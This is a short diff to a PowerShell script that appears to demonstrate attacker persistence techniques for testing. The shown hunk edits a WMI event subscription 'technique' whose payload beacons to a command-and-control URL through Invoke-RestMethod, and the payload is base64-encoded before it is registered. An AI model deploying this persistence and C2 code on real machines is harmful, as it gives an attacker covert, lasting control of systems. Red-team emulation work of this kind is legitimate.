@@ -439,6 +439,7 @@ function Undo-LiveChanges {
 
 function Show-WMIEventSub {
     $WmiNamespace = "root\subscription"
+    $desktopPath = [Environment]::GetFolderPath('Desktop')
 
     if ($Global:DemoMode) {
         Write-Host "[+] Technique 6: WMI Event Subscription (DEMO ONLY - Not Executed)" -ForegroundColor Green
@@ -460,7 +461,7 @@ function Show-WMIEventSub {
             Invoke-RestMethod -Uri '$Global:C2Url/?message=how-are-you-session=$($Global:UniqueId)' -Method Get -ErrorAction SilentlyContinue
             Add-Content -Path '$desktopPath\calcLOG.txt' -Value 'Successfully executed payload via WMI.' -ErrorAction SilentlyContinue
         } catch { }
-    "@
+"@
 
         $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
         $EventName = "EventSubscription"
